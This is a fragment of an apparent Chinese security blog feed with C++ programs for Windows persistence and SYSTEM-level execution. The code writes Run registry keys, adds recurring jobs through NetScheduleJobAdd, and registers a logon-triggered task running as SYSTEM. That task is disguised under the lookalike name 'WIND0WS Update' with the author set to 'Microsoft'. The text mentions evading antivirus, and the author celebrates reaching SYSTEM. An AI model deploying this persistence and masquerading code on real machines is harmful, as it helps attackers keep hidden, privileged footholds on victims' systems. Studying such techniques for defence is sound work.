class="keyword">int</span> <span class="title">autopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* key_name, <span class="keyword">const</span> <span class="keyword">char</span>* process_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> reg_name[] = <span class="string">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span>;</span><br><span class="line"><span class="keyword">return</span> regedit(HKEY_LOCAL_MACHINE, reg_name, key_name, process_path);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> key_name;</span><br><span class="line"><span class="built_in">string</span> process_path;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"注册项名称 文件路径\n"</span>;</span><br><span class="line">getline(<span class="built_in">cin</span>, key_name);</span><br><span class="line">getline(<span class="built_in">cin</span>, process_path);</span><br><span class="line"><span class="comment">//cout &lt;&lt; process_path;</span></span><br><span class="line"><span class="keyword">int</span> ret = autopen(key_name.c_str(), process_path.c_str());</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"write to register succeed\n"</span>);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"错误响应码：%d\n"</span>, ret);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"write to register failed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><b>x86</b></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> reg_name[] = <span class="string">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span>;</span><br><span class="line">LPCTSTR lpSubKey = reg_name;</span><br><span class="line">HKEY hKey;</span><br><span class="line">REGSAM flag = KEY_WOW64_64KEY; <span class="comment">//判断是否为64位</span></span><br><span class="line">DWORD dwDisposition = REG_OPENED_EXISTING_KEY;</span><br><span class="line">LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, reg_name, <span class="number">0</span>, KEY_ALL_ACCESS | flag, &amp;hKey);</span><br><span class="line"><span class="comment">//LONG lRet = ::RegCreateKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, NULL, NULL, REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS, NULL, &amp;hKey, &amp;dwDisposition);  </span></span><br><span class="line"><span class="keyword">if</span> (ERROR_SUCCESS != lRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> setPath[]= <span class="string">"C:\\Windows\\system32\\cmd.exe"</span>;</span><br><span class="line">TCHAR* pchrName = setPath;</span><br><span class="line">lRet = ::RegSetValueEx(hKey, TEXT(<span class="string">"TEST"</span>), <span class="literal">NULL</span>, REG_SZ, (LPBYTE)pchrName, <span class="number">100</span>); <span class="comment">//设置注册表项  </span></span><br><span class="line"><span class="keyword">if</span> (ERROR_SUCCESS != lRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">::RegCloseKey(hKey); <span class="comment">//与RegCreateKeyEx配对写 </span></span><br><span class="line">PostMessage(HWND_BROADCAST, WM_COMMAND, <span class="number">41504</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="利用CMD命令行创建计划任务"><a href="#利用CMD命令行创建计划任务" class="headerlink" title="利用CMD命令行创建计划任务"></a>利用CMD命令行创建计划任务</h1><p><b>CMD 命令行下有两个命令可以创建计划任务，一个是at，另一个是schtasks。</b></p><ul><li>at 命令仅在 Win7 及以下系统有效，支持指定任务的执行时间，支持远程创建计划任务，但不能指定任务在系统启动或用户登录时启动。与schtasks命令相比，其优势是创建计划任务所需的命令比较简单。</li><li>schtasks支持 Windows 全系列系统，与at命令相比，可设置的选项更加丰富，能适应更多的应用场景，同时还允许指定任务在系统启动、用户登录甚至是系统闲置时间启动。</li></ul><p><b>缺点：at只能在windows7-以及windows 2008以下系统运行。并且调用at、sc等去做计划任务的话，容易被杀软监测到。效率比较低，可能得做好免杀。</b></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个是at的计划任务</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;lmcons.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;lmat.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"netapi32.lib"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">///计划任务</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Jobadd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD JobId, ret;</span><br><span class="line">    AT_INFO ai;</span><br><span class="line">    <span class="built_in">string</span> filepath;</span><br><span class="line">    <span class="built_in">string</span> RootPath;</span><br><span class="line">    <span class="built_in">string</span> Rootapp;</span><br><span class="line">    <span class="keyword">long</span> Len;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; RootPath;</span><br><span class="line">    WCHAR szFilePath[<span class="number">100000</span>];</span><br><span class="line">    <span class="comment">//GetSystemDirectory(&amp;RootPath[0], MAX_PATH);</span></span><br><span class="line">    filepath = RootPath;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; Rootapp;</span><br><span class="line">    filepath += Rootapp;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;ai, <span class="number">0</span>, <span class="keyword">sizeof</span>(ai));</span><br><span class="line">    Len = MultiByteToWideChar(CP_ACP, <span class="number">0</span>, filepath.c_str(), <span class="built_in">strlen</span>(filepath.c_str()), szFilePath, <span class="keyword">sizeof</span>(szFilePath));</span><br><span class="line">    szFilePath[Len] = <span class="string">'\0'</span>;</span><br><span class="line">    ai.Command = szFilePath;</span><br><span class="line">    ai.DaysOfMonth = <span class="number">0</span>;</span><br><span class="line">    ai.DaysOfWeek = <span class="number">0x7F</span>; <span class="comment">//7F等于二进制的7个1，就是每周的7天全部运行  </span></span><br><span class="line">    ai.Flags = JOB_RUN_PERIODICALLY;</span><br><span class="line">    ai.JobTime = <span class="number">22</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span> + <span class="number">21</span> * <span class="number">60</span> * <span class="number">1000</span>; <span class="comment">//22点21分，这里是以毫秒为单位的，所以需要乘这些值  </span></span><br><span class="line">    ret = NetScheduleJobAdd(<span class="literal">NULL</span>, LPBYTE(&amp;ai), &amp;JobId);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ret &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; NetScheduleJobAdd(<span class="literal">NULL</span>, LPBYTE(&amp;ai), &amp;JobId) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//if (ret == ERROR_SUCCESS)</span></span><br><span class="line">      <span class="comment">//  std::cout &lt;&lt; " SUCCESS!!" &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">//else</span></span><br><span class="line">     <span class="comment">//   std::cout &lt;&lt; "Error" &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    Jobadd();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qq_38777624/article/details/109217325" target="_blank" rel="noopener">Windows 注册表相关API总结</a></p><p><a href="https://www.cxymm.net/article/yurnero123/41080367" target="_blank" rel="noopener">几个修改注册表后立即生效的刷新方法</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;书接上回嘿嘿&lt;/p&gt;</summary>
    
    
    
    <category term="win" scheme="https://chenzidu.github.io/categories/win/"/>
    
    
    <category term="C++" scheme="https://chenzidu.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>C++提权的几种方式(win)(一)</title>
    <link href="https://chenzidu.github.io/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
    <id>https://chenzidu.github.io/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</id>
    <published>2022-02-09T09:32:05.000Z</published>
    <updated>2022-12-11T09:31:21.953Z</updated>
    
    <content type="html"><![CDATA[<p>之前在学校的时候打acm用的C++，不过没学过底层的东西。没想到竟然有一天，会拿着C++看算法以外的东西。提到权的那一刻是真爽啊！下面只给了Task Scheduler 2.0的图，其他的图忘记截了= =</p><a id="more"></a><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p><b>Q：Task schduler是什么?</b></p><p>A：Task schduler：任务调度程序，可以理解他的作用跟 Linux 下的 Crontab 作用类似，但是要比 Linux Crontab 强大很多。不单单可以执行定时任务，还可以根据某些特定的条件来启动其他应用，发送电子邮件等任务。</p><p><b>Q：为什么提的权限要是SYSTEM账户?</b></p><p>A：SYSTEM 用户和使用普通管理员用户对于文件有同样的特权。系统帐户可以由 Windows 下执行的服务和操作系统使用。有很多服务和 Windows 进程须要可以在内部登录（比如在 Windows 安装过程中）而系统帐户就是为该目的设计的；它是内部帐户，不显示在用户管理器，也无法加入到不论什么组，而且不能分配用户权限。可是对于一些服务和进程，我们须要使用系统账户而非管理员账户，由于这些服务和进程要和系统交互，须要内部登录。</p><p>在运行计划任务的时候，假设我们使用NT AUTHORITY\SYSTEM 账户，是不须要输入密码的。如果使用了其他管理员账户，我们必须输入密码。一般我们使用系统账户，主要是为了防止管理员改变密码后任务无法运行。</p><hr><p><b>关于计划任务的设定，可以参考这篇文章<a href="https://docs.microsoft.com/zh-cn/windows/win32/taskschd/security-contexts-for-running-tasks" target="_blank" rel="noopener">任务的安全上下文</a>，例如 Administrators 组或 SYSTEM 帐户的成员可以读取、更新、删除和运行任何任务。 “用户”组、LocalService 帐户和 NetworkService 帐户的成员只能读取、更新、删除和运行已创建的任务。</b></p><hr><h1 id="C-Task-Scheduler-2-0提权"><a href="#C-Task-Scheduler-2-0提权" class="headerlink" title="C++ Task Scheduler 2.0提权"></a>C++ Task Scheduler 2.0提权</h1><h3 id="注意：客户端需要-Windows-Vista-或更高版本。服务器需要-Windows-Server-2008-或更高版本。必须要管理员权限才可以运行添加计划任务。"><a href="#注意：客户端需要-Windows-Vista-或更高版本。服务器需要-Windows-Server-2008-或更高版本。必须要管理员权限才可以运行添加计划任务。" class="headerlink" title="注意：客户端需要 Windows Vista 或更高版本。服务器需要 Windows Server 2008 或更高版本。必须要管理员权限才可以运行添加计划任务。"></a>注意：客户端需要 Windows Vista 或更高版本。服务器需要 Windows Server 2008 或更高版本。必须要管理员权限才可以运行添加计划任务。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;comdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wincred.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;taskschd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"taskschd.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"comsupp.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"credui.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">wmain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化COM</span></span><br><span class="line">    HRESULT hr = CoInitializeEx(<span class="literal">NULL</span>, COINIT_MULTITHREADED);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nCoInitializeEx failed: %x"</span>, hr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注册安全性并设置该过程的默认安全性值。</span></span><br><span class="line">    hr = CoInitializeSecurity(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">-1</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,</span><br><span class="line">        RPC_C_IMP_LEVEL_IMPERSONATE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line">    LPCWSTR wszTaskName = <span class="string">L"WIND0WS Update"</span>; <span class="comment">//设置计划任务名称</span></span><br><span class="line">    <span class="comment">//创建ITaskService的实例</span></span><br><span class="line">    ITaskService* pService = <span class="literal">NULL</span>;</span><br><span class="line">    hr = CoCreateInstance(CLSID_TaskScheduler,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        CLSCTX_INPROC_SERVER,</span><br><span class="line">        IID_ITaskService,</span><br><span class="line">        (<span class="keyword">void</span>**)&amp;pService);</span><br><span class="line">    <span class="comment">// 链接到任务实例</span></span><br><span class="line">    hr = pService-&gt;Connect(<span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>(),</span><br><span class="line">        <span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>());</span><br><span class="line">    <span class="comment">//     获取指向根任务文件夹的指针。</span></span><br><span class="line">    ITaskFolder* pRootFolder = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pService-&gt;GetFolder(<span class="keyword">_bstr_t</span>(<span class="string">L"\\"</span>), &amp;pRootFolder);</span><br><span class="line">    <span class="comment">//  如果存在相同的任务删除该任务</span></span><br><span class="line">    pRootFolder-&gt;DeleteTask(<span class="keyword">_bstr_t</span>(wszTaskName), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//  创建任务生成器对象以创建任务。</span></span><br><span class="line">    ITaskDefinition* pTask = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pService-&gt;NewTask(<span class="number">0</span>, &amp;pTask);</span><br><span class="line">    pService-&gt;Release();  <span class="comment">//清理Com</span></span><br><span class="line">    <span class="comment">// 获取注册信息</span></span><br><span class="line">    IRegistrationInfo* pRegInfo = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_RegistrationInfo(&amp;pRegInfo);</span><br><span class="line">    hr = pRegInfo-&gt;put_Author((<span class="keyword">_bstr_t</span>)<span class="string">"Microsoft"</span>);                                <span class="comment">// 修改你想要改的计划任务创建者</span></span><br><span class="line">    <span class="comment">//  创建计划任务设置</span></span><br><span class="line">    ITaskSettings* pSettings = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_Settings(&amp;pSettings);</span><br><span class="line">    <span class="comment">//      设置任务的设置值</span></span><br><span class="line">    hr = pSettings-&gt;put_StartWhenAvailable(VARIANT_TRUE);</span><br><span class="line">    pSettings-&gt;Release();</span><br><span class="line">    <span class="comment">//  ------------------------------------------------------</span></span><br><span class="line">    <span class="comment">//  获取取触发器集合以插入登录触发器。</span></span><br><span class="line">    ITriggerCollection* pTriggerCollection = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_Triggers(&amp;pTriggerCollection);</span><br><span class="line">    <span class="comment">//  添加触发器</span></span><br><span class="line">    ITrigger* pTrigger = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTriggerCollection-&gt;Create(TASK_TRIGGER_LOGON, &amp;pTrigger);   <span class="comment">//TASK_TRIGGER_EVENT    事件触发</span></span><br><span class="line">    pTriggerCollection-&gt;Release();</span><br><span class="line">    ILogonTrigger* pLogonTrigger = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTrigger-&gt;QueryInterface(</span><br><span class="line">        IID_ILogonTrigger, (<span class="keyword">void</span>**)&amp;pLogonTrigger);</span><br><span class="line">    pTrigger-&gt;Release();</span><br><span class="line">    hr = pLogonTrigger-&gt;put_Id(<span class="keyword">_bstr_t</span>(<span class="string">L"Trigger1"</span>));</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    //设置指定触发时间 如果不设置 代表任何时间都可以触发</span></span><br><span class="line"><span class="comment">    hr = pLogonTrigger-&gt;put_StartBoundary( _bstr_t(L"2020-10-30T08:00:00") );</span></span><br><span class="line"><span class="comment">    hr = pLogonTrigger-&gt;put_EndBoundary( _bstr_t(L"2020-10-30T08:00:00") );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    //  定义某个用户 登录时触发 注释掉代表所有用户登录后触发</span></span><br><span class="line"><span class="comment">    hr = pLogonTrigger-&gt;put_UserId( _bstr_t( L"administrator" ) );   //某用户登录后触发 设置某用户</span></span><br><span class="line"><span class="comment">    pLogonTrigger-&gt;Release();</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    IActionCollection* pActionCollection = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_Actions(&amp;pActionCollection);</span><br><span class="line">    IAction* pAction = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pActionCollection-&gt;Create(TASK_ACTION_EXEC, &amp;pAction); <span class="comment">//触发程序执行：TASK_ACTION_EXEC</span></span><br><span class="line">    IExecAction* pExecAction = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pAction-&gt;QueryInterface(</span><br><span class="line">        IID_IExecAction, (<span class="keyword">void</span>**)&amp;pExecAction);</span><br><span class="line">    <span class="built_in">string</span> cmdName;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"输入文件位置：\n"</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; cmdName;</span><br><span class="line">    hr = pExecAction-&gt;put_Path(<span class="keyword">_bstr_t</span>(cmdName.c_str()));</span><br><span class="line">    pExecAction-&gt;Release();</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" 无法设置程序执行路径: %x"</span>, hr);</span><br><span class="line">        pRootFolder-&gt;Release();</span><br><span class="line">        pTask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    IRegisteredTask* pRegisteredTask = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pRootFolder-&gt;RegisterTaskDefinition(</span><br><span class="line">        <span class="keyword">_bstr_t</span>(wszTaskName),</span><br><span class="line">        pTask,</span><br><span class="line">        TASK_CREATE_OR_UPDATE,  <span class="comment">// 创建并覆盖现有的计划任务：TASK_CREATE_OR_UPDATE </span></span><br><span class="line">                                                        <span class="comment">//仅更新：TASK_UPDATE</span></span><br><span class="line">                                                        <span class="comment">//仅创建：TASK_CREATE</span></span><br><span class="line">                                                        <span class="comment">//禁用：TASK_DISABLE</span></span><br><span class="line">        <span class="keyword">_variant_t</span>(<span class="string">L"system"</span>),  <span class="comment">// 启动身份 system 或者administrator </span></span><br><span class="line">        <span class="keyword">_variant_t</span>(),</span><br><span class="line">        TASK_LOGON_GROUP, <span class="comment">//登录技术  组激活：TASK_LOGON_GROUP 用户登录后激活：TASK_LOGON_INTERACTIVE_TOKEN</span></span><br><span class="line">        <span class="keyword">_variant_t</span>(<span class="string">L""</span>),</span><br><span class="line">        &amp;pRegisteredTask);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n无法保存计划任务 : %x"</span>, hr);</span><br><span class="line">        pRootFolder-&gt;Release();</span><br><span class="line">        pTask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Success！成功注册计划任务 "</span>);</span><br><span class="line">    pRootFolder-&gt;Release();</span><br><span class="line">    pTask-&gt;Release();</span><br><span class="line">    pRegisteredTask-&gt;Release();</span><br><span class="line">    CoUninitialize();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后，把绝对路径输入后，成功提权至system,非常的爽</p><p><img src="cmd.jpg" alt=""></p><p><img src="jhrw.jpg" alt=""></p><p><img src="cs.png" alt="cs"></p><h1 id="C-Task-Scheduler-1-0写入提权（利用COM组件的-API-编程创建计划任务）"><a href="#C-Task-Scheduler-1-0写入提权（利用COM组件的-API-编程创建计划任务）" class="headerlink" title="C++ Task Scheduler 1.0写入提权（利用COM组件的 API 编程创建计划任务）"></a>C++ Task Scheduler 1.0写入提权（利用COM组件的 API 编程创建计划任务）</h1><h3 id="注意：Task-Scheduler-1-0是在C-Windows-Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要-Windows-Vista-或-Windows-XP。服务器需要-Windows-Server-2008-或-Windows-Server-2003。"><a href="#注意：Task-Scheduler-1-0是在C-Windows-Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要-Windows-Vista-或-Windows-XP。服务器需要-Windows-Server-2008-或-Windows-Server-2003。" class="headerlink" title="注意：Task Scheduler 1.0是在C:\Windows\Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要 Windows Vista 或 Windows 